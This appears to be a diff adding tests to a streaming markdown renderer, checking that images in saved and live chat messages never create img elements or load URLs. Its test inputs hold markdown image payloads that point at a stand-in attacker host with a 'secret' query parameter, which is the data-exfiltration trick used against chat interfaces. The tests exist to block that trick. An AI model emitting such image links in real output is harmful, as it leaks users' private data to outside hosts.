@@ -63,3 +63,73 @@ for (const [input, expected] of cases) {
         }
     });
 }
+
+// Exercise the DOM renderer used by both saved conversations and live streams.
+// Reject image creation and src assignment immediately: removing them later
+// would not prevent the browser from making a request.
+function renderDefault(chunks) {
+    const previousDocument = globalThis.document;
+    function element(tagName) {
+        assert.notEqual(tagName.toLowerCase(), "img", "must never create an image element");
+        return {
+            tagName: tagName.toUpperCase(),
+            children: [],
+            attributes: {},
+            appendChild(child) {
+                this.children.push(child);
+                child.parentElement = this;
+                return child;
+            },
+            setAttribute(name, value) {
+                assert.notEqual(name, "src", "must never assign an image URL");
+                this.attributes[name] = value;
+            },
+            get textContent() {
+                return this.children.map(child => child.textContent).join("");
+            },
+        };
+    }
+    globalThis.document = {
+        createElement: element,
+        createTextNode: text => ({ textContent: text }),
+    };
+    try {
+        const root = element("div");
+        const parser = smd.parser(smd.default_renderer(root));
+        for (const chunk of chunks) smd.parser_write(parser, chunk);
+        smd.parser_end(parser);
+        return root;
+    } finally {
+        if (previousDocument === undefined) delete globalThis.document;
+        else globalThis.document = previousDocument;
+    }
+}
+
+const imageCases = [
+    ["Before ![private data](https://evil.example/leak?secret=123) after.", "Before private data after."],
+    ["![relative](/leak?secret=123)", "relative"],
+    ["![protocol relative](//evil.example/leak?secret=123)", "protocol relative"],
+    ["![embedded](data:image/png;base64,aGVsbG8=)", "embedded"],
+    ["![blob](blob:https://example.com/image)", "blob"],
+    ["![](https://evil.example/leak?secret=123)", ""],
+    ["![first](https://evil.example/1) ![second](https://evil.example/2)", "first second"],
+    ["[![linked image](https://evil.example/leak)](/demo)", "linked image"],
+    ["![unfinished](https://evil.example/leak", "unfinished"],
+    ['<img src="https://evil.example/leak">', '<img src="https://evil.example/leak">'],
+];
+for (const [input, expected] of imageCases) {
+    test("images stay inert: " + input, () => {
+        assert.equal(renderDefault([input]).textContent, expected, "saved message");
+        assert.equal(renderDefault(Array.from(input)).textContent, expected, "one character per chunk");
+        for (let split = 0; split <= input.length; split++) {
+            assert.equal(renderDefault([input.slice(0, split), input.slice(split)]).textContent, expected, "split at " + split);
+        }
+    });
+}
+
+test("the DOM renderer preserves links alongside disabled images", () => {
+    const root = renderDefault(["![alt](https://evil.example/leak) [table](/demo/items)"]);
+    const link = root.children[0].children.find(child => child.tagName === "A");
+    assert.equal(link.textContent, "table");
+    assert.equal(link.attributes.href, "/demo/items");
+});
